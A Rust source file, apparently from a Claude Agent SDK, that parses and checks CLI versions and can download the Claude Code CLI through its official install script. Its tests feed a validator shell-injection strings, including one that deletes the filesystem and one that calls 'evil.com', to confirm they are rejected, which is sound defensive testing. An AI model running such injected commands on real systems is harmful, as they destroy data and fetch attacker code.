//! Version information for the Claude Agent SDK

use std::sync::OnceLock;
use tracing::info;

/// The version of this SDK
pub const SDK_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Minimum required Claude Code CLI version
pub const MIN_CLI_VERSION: &str = "2.0.0";

/// Bundled Claude Code CLI version (build.rs downloads this version when `bundled-cli` feature is enabled)
pub const CLI_VERSION: &str = "2.1.38";

/// Bundled CLI storage directory (relative to home directory)
pub(crate) const BUNDLED_CLI_DIR: &str = ".claude/sdk/bundled";

/// Get the full path to the bundled CLI binary.
///
/// Returns `Some(path)` where path is `~/.claude/sdk/bundled/{CLI_VERSION}/claude` (or `claude.exe` on Windows).
/// Returns `None` if the home directory cannot be determined.
pub fn bundled_cli_path() -> Option<std::path::PathBuf> {
    dirs::home_dir().map(|home| {
        let cli_name = if cfg!(target_os = "windows") {
            "claude.exe"
        } else {
            "claude"
        };
        home.join(BUNDLED_CLI_DIR).join(CLI_VERSION).join(cli_name)
    })
}

/// Environment variable to skip version check
pub const SKIP_VERSION_CHECK_ENV: &str = "CLAUDE_AGENT_SDK_SKIP_VERSION_CHECK";

/// Entrypoint identifier for subprocess
pub const ENTRYPOINT: &str = "sdk-rs";

/// Parse a semantic version string into (major, minor, patch)
pub fn parse_version(version: &str) -> Option<(u32, u32, u32)> {
    let parts: Vec<&str> = version.trim_start_matches('v').split('.').collect();
    if parts.len() < 3 {
        return None;
    }

    let major = parts[0].parse().ok()?;
    let minor = parts[1].parse().ok()?;
    let patch = parts[2].parse().ok()?;

    Some((major, minor, patch))
}

/// Check if the CLI version meets the minimum requirement
pub fn check_version(cli_version: &str) -> bool {
    let Some((cli_maj, cli_min, cli_patch)) = parse_version(cli_version) else {
        return false;
    };

    let Some((req_maj, req_min, req_patch)) = parse_version(MIN_CLI_VERSION) else {
        return false;
    };

    if cli_maj > req_maj {
        return true;
    }
    if cli_maj < req_maj {
        return false;
    }

    // Major versions are equal
    if cli_min > req_min {
        return true;
    }
    if cli_min < req_min {
        return false;
    }

    // Major and minor are equal
    cli_patch >= req_patch
}

/// Cached Claude Code CLI version
static CLAUDE_CODE_VERSION: OnceLock<Option<String>> = OnceLock::new();

/// Get Claude Code CLI version
///
/// This function uses OnceLock to cache the result, so the CLI is only called once.
/// Returns None if CLI is not found or version cannot be determined.
pub fn get_claude_code_version() -> Option<&'static str> {
    CLAUDE_CODE_VERSION
        .get_or_init(|| {
            std::process::Command::new("claude")
                .arg("--version")
                .output()
                .ok()
                .filter(|output| output.status.success())
                .and_then(|output| {
                    let version_output = String::from_utf8_lossy(&output.stdout);
                    version_output
                        .lines()
                        .next()
                        .and_then(|line| line.split_whitespace().next())
                        .map(|v| v.trim().to_string())
                })
        })
        .as_deref()
}

/// Validate that a version string contains only digits and dots (semver format).
///
/// This prevents shell injection when the version is interpolated into install commands.
fn validate_version_string(version: &str) -> std::result::Result<(), String> {
    if version.is_empty() {
        return Err("Version string is empty".to_string());
    }
    if !version.chars().all(|c| c.is_ascii_digit() || c == '.') {
        return Err(format!(
            "Version string contains invalid characters: '{version}'. Only digits and dots are allowed."
        ));
    }
    Ok(())
}

/// Download Claude Code CLI to the bundled directory at runtime.
///
/// Downloads CLI v[`CLI_VERSION`] to `~/.claude/sdk/bundled/{CLI_VERSION}/claude`.
/// Returns the path to the downloaded binary.
///
/// This is the runtime equivalent of the `build.rs` download that happens
/// when the `bundled-cli` feature is enabled at compile time.
///
/// # Safety considerations
///
/// This function executes the official install script from `https://claude.ai/install.sh`
/// (Unix) or `https://claude.ai/install.ps1` (Windows). It should only be called when
/// explicitly opted in via `ClaudeAgentOptions::auto_download_cli`.
///
/// The version string is validated to contain only digits and dots before being
/// interpolated into shell commands, preventing injection attacks.
pub(crate) fn download_cli() -> std::result::Result<std::path::PathBuf, String> {
    // Validate version string before any shell interpolation
    validate_version_string(CLI_VERSION)?;

    let bundled_path = bundled_cli_path().ok_or("Cannot determine home directory")?;

    // Already exists, return immediately
    if bundled_path.exists() {
        info!("Bundled CLI already exists at: {}", bundled_path.display());
        return Ok(bundled_path);
    }

    let bundled_dir = bundled_path.parent().ok_or("Invalid bundled CLI path")?;
    std::fs::create_dir_all(bundled_dir).map_err(|e| format!("Failed to create directory: {e}"))?;

    // Acquire file lock to prevent concurrent downloads
    let lock_path = bundled_dir.join(".download.lock");
    let lock_file = std::fs::File::create(&lock_path)
        .map_err(|e| format!("Failed to create lock file: {e}"))?;
    acquire_file_lock(&lock_file)?;

    // Re-check after acquiring lock (another process may have completed download)
    if bundled_path.exists() {
        info!(
            "Bundled CLI appeared after acquiring lock: {}",
            bundled_path.display()
        );
        return Ok(bundled_path);
    }

    info!(
        "Downloading Claude Code CLI v{} to {}...",
        CLI_VERSION,
        bundled_dir.display()
    );

    // Platform-specific download
    #[cfg(not(target_os = "windows"))]
    let result = download_cli_unix(CLI_VERSION, bundled_dir, &bundled_path);

    #[cfg(target_os = "windows")]
    let result = download_cli_windows(CLI_VERSION, bundled_dir, &bundled_path);

    // Lock is released when lock_file is dropped
    drop(lock_file);
    let _ = std::fs::remove_file(&lock_path);

    result?;

    if bundled_path.exists() {
        info!(
            "Claude CLI v{} downloaded to: {}",
            CLI_VERSION,
            bundled_path.display()
        );
        Ok(bundled_path)
    } else {
        Err("CLI binary not found after download. Check network connection.".to_string())
    }
}

/// Acquire an exclusive file lock (blocking).
///
/// Uses `libc::flock` for reliable cross-process file locking.
/// This is an FFI call which is the only justified use of `unsafe` per project guidelines.
#[cfg(unix)]
fn acquire_file_lock(file: &std::fs::File) -> std::result::Result<(), String> {
    use std::os::unix::io::AsRawFd;
    // SAFETY: flock is a standard POSIX syscall. The file descriptor is valid
    // because it comes from a live std::fs::File. LOCK_EX blocks until the lock
    // is available and is released when the file descriptor is closed (on drop).
    let ret = unsafe { libc::flock(file.as_raw_fd(), libc::LOCK_EX) };
    if ret != 0 {
        return Err(format!(
            "Failed to acquire file lock: {}",
            std::io::Error::last_os_error()
        ));
    }
    Ok(())
}

/// Acquire an exclusive file lock (blocking) — Windows stub.
#[cfg(not(unix))]
fn acquire_file_lock(_file: &std::fs::File) -> std::result::Result<(), String> {
    // On Windows, file creation itself provides some mutual exclusion.
    // A proper implementation would use LockFileEx, but for now this is
    // acceptable since concurrent cargo-dist installs on Windows are rare.
    Ok(())
}

/// Generate a unique temporary file name using the process ID to avoid collisions.
fn unique_tmp_name(prefix: &str, ext: &str) -> String {
    format!("{prefix}.{pid}{ext}", pid = std::process::id())
}

/// Download CLI on Unix-like systems using the official install script.
///
/// Uses `curl -fsSL https://claude.ai/install.sh | bash -s -- '{version}'`
/// to install the CLI, then copies it to the bundled directory.
/// Backs up and restores any existing `~/.local/bin/claude`.
#[cfg(not(target_os = "windows"))]
fn download_cli_unix(
    version: &str,
    bundled_dir: &std::path::Path,
    target: &std::path::Path,
) -> std::result::Result<(), String> {
    use std::process::Command;

    let home = dirs::home_dir().ok_or("Cannot determine home directory")?;
    let default_install_path = home.join(".local/bin/claude");

    // Backup existing binary to avoid overwriting user's installation.
    // Use PID-unique backup name to prevent multi-process collisions.
    let had_existing = default_install_path.exists();
    let backup_name = unique_tmp_name(".claude.sdk-backup", "");
    let backup_path = home.join(".local/bin").join(&backup_name);
    if had_existing {
        std::fs::copy(&default_install_path, &backup_path).map_err(|e| {
            format!(
                "Failed to backup existing CLI at {}: {e}. Aborting download to avoid data loss.",
                default_install_path.display()
            )
        })?;
    }

    let install_cmd = format!("curl -fsSL https://claude.ai/install.sh | bash -s -- '{version}'");

    let status = Command::new("bash")
        .args(["-c", &install_cmd])
        .status()
        .map_err(|e| {
            restore_backup(had_existing, &backup_path, &default_install_path);
            format!("Failed to execute install script: {e}")
        })?;

    if !status.success() {
        restore_backup(had_existing, &backup_path, &default_install_path);
        return Err(format!(
            "Install script failed with exit code: {:?}",
            status.code()
        ));
    }

    // Find installed binary from known locations
    let search_paths = [
        default_install_path.clone(),
        std::path::PathBuf::from("/usr/local/bin/claude"),
    ];
    let installed = search_paths.iter().find(|p| p.exists()).ok_or_else(|| {
        restore_backup(had_existing, &backup_path, &default_install_path);
        "Could not find installed CLI binary after install.sh".to_string()
    })?;

    // Atomic copy to bundled dir via PID-unique temp file
    let tmp_name = unique_tmp_name(".claude", ".tmp");
    let tmp_path = bundled_dir.join(&tmp_name);
    std::fs::copy(installed, &tmp_path).map_err(|e| format!("Failed to copy CLI: {e}"))?;

    // Set executable permission
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&tmp_path)
            .map_err(|e| format!("Failed to read temp file metadata: {e}"))?
            .permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&tmp_path, perms)
            .map_err(|e| format!("Failed to set executable permission: {e}"))?;
    }

    // Move to final location (fall back to copy if rename fails across filesystems)
    std::fs::rename(&tmp_path, target)
        .or_else(|rename_err| {
            std::fs::copy(&tmp_path, target)
                .map(|_| ())
                .map_err(|copy_err| {
                    format!(
                        "Failed to move CLI to final path: rename failed ({rename_err}), copy also failed ({copy_err})"
                    )
                })
        })?;
    let _ = std::fs::remove_file(&tmp_path);

    // Restore user's original CLI binary
    restore_backup(had_existing, &backup_path, &default_install_path);

    Ok(())
}

/// Restore a backup file to its original location, cleaning up the backup.
#[cfg(not(target_os = "windows"))]
fn restore_backup(
    had_existing: bool,
    backup_path: &std::path::Path,
    original_path: &std::path::Path,
) {
    if had_existing && let Err(e) = std::fs::rename(backup_path, original_path) {
        tracing::warn!(
            "Failed to restore CLI backup from {} to {}: {}",
            backup_path.display(),
            original_path.display(),
            e
        );
    }
    let _ = std::fs::remove_file(backup_path);
}

/// Download CLI on Windows using PowerShell.
#[cfg(target_os = "windows")]
fn download_cli_windows(
    version: &str,
    bundled_dir: &std::path::Path,
    target: &std::path::Path,
) -> std::result::Result<(), String> {
    use std::process::Command;

    let install_cmd = format!(
        "$ErrorActionPreference='Stop'; irm https://claude.ai/install.ps1 | iex; claude install '{version}'"
    );

    let status = Command::new("powershell")
        .args([
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &install_cmd,
        ])
        .status()
        .map_err(|e| format!("Failed to execute PowerShell install script: {e}"))?;

    if !status.success() {
        return Err(format!(
            "Install script failed with exit code: {:?}",
            status.code()
        ));
    }

    // Find installed binary
    let home = dirs::home_dir().ok_or("Cannot determine home directory")?;
    let possible_paths = [
        home.join("AppData\\Local\\Programs\\Claude\\claude.exe"),
        home.join("AppData\\Roaming\\npm\\claude.cmd"),
        home.join(".local\\bin\\claude.exe"),
    ];

    let installed = possible_paths
        .iter()
        .find(|p| p.exists())
        .ok_or("Could not find installed CLI binary")?;

    // Atomic copy via PID-unique temp file
    let tmp_name = unique_tmp_name(".claude", ".exe.tmp");
    let tmp_path = bundled_dir.join(&tmp_name);
    std::fs::copy(installed, &tmp_path).map_err(|e| format!("Failed to copy CLI: {e}"))?;

    std::fs::rename(&tmp_path, target)
        .or_else(|rename_err| {
            std::fs::copy(&tmp_path, target)
                .map(|_| ())
                .map_err(|copy_err| {
                    format!(
                        "Failed to move CLI to final path: rename failed ({rename_err}), copy also failed ({copy_err})"
                    )
                })
        })?;
    let _ = std::fs::remove_file(&tmp_path);

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_version() {
        assert_eq!(parse_version("1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("v1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("10.20.30"), Some((10, 20, 30)));
        assert_eq!(parse_version("1.2"), None);
        assert_eq!(parse_version("invalid"), None);
    }

    #[test]
    fn test_check_version() {
        assert!(check_version("2.0.0"));
        assert!(check_version("2.0.1"));
        assert!(check_version("2.1.0"));
        assert!(check_version("3.0.0"));
        assert!(!check_version("1.9.9"));
        assert!(!check_version("1.99.99"));
    }

    #[test]
    fn test_cli_version_format() {
        assert!(
            parse_version(CLI_VERSION).is_some(),
            "CLI_VERSION must be a valid semver string"
        );
    }

    #[test]
    fn test_cli_version_meets_minimum() {
        assert!(
            check_version(CLI_VERSION),
            "CLI_VERSION ({}) must meet MIN_CLI_VERSION ({})",
            CLI_VERSION,
            MIN_CLI_VERSION
        );
    }

    #[test]
    fn test_bundled_cli_path_format() {
        if let Some(path) = bundled_cli_path() {
            let path_str = path.to_string_lossy();
            assert!(
                path_str.contains(".claude/sdk/bundled"),
                "bundled path must contain '.claude/sdk/bundled': {}",
                path_str
            );
            assert!(
                path_str.contains(CLI_VERSION),
                "bundled path must contain CLI_VERSION ({}): {}",
                CLI_VERSION,
                path_str
            );
        }
    }

    #[test]
    fn test_validate_version_string_valid() {
        assert!(validate_version_string("2.1.38").is_ok());
        assert!(validate_version_string("0.0.1").is_ok());
        assert!(validate_version_string("10.20.30").is_ok());
    }

    #[test]
    fn test_validate_version_string_rejects_empty() {
        assert!(validate_version_string("").is_err());
    }

    #[test]
    fn test_validate_version_string_rejects_injection() {
        assert!(validate_version_string("'; rm -rf /; '").is_err());
        assert!(validate_version_string("1.0.0; echo pwned").is_err());
        assert!(validate_version_string("$(curl evil.com)").is_err());
        assert!(validate_version_string("1.0.0-beta").is_err());
        assert!(validate_version_string("v1.0.0").is_err());
    }

    #[test]
    fn test_validate_version_string_rejects_special_chars() {
        assert!(validate_version_string("1.0.0 ").is_err());
        assert!(validate_version_string("1.0.0\n").is_err());
        assert!(validate_version_string("1.0.0\t2.0.0").is_err());
    }

    #[test]
    fn test_cli_version_passes_validation() {
        assert!(
            validate_version_string(CLI_VERSION).is_ok(),
            "CLI_VERSION ({}) must pass version validation",
            CLI_VERSION
        );
    }

    #[test]
    fn test_download_cli_returns_existing_path() {
        // If the bundled path already exists, download_cli should return it
        // without attempting any download
        if let Some(bundled_path) = bundled_cli_path()
            && bundled_path.exists()
        {
            let result = download_cli();
            assert!(result.is_ok());
            assert_eq!(result.unwrap(), bundled_path);
        }
    }

    #[test]
    fn test_unique_tmp_name_includes_pid() {
        let name = unique_tmp_name(".claude", ".tmp");
        let pid = std::process::id().to_string();
        assert!(
            name.contains(&pid),
            "Temp name '{}' should contain PID '{}'",
            name,
            pid
        );
    }

    #[test]
    fn test_unique_tmp_name_format() {
        let name = unique_tmp_name(".claude", ".tmp");
        assert!(name.starts_with(".claude."));
        assert!(name.ends_with(".tmp"));
    }
}
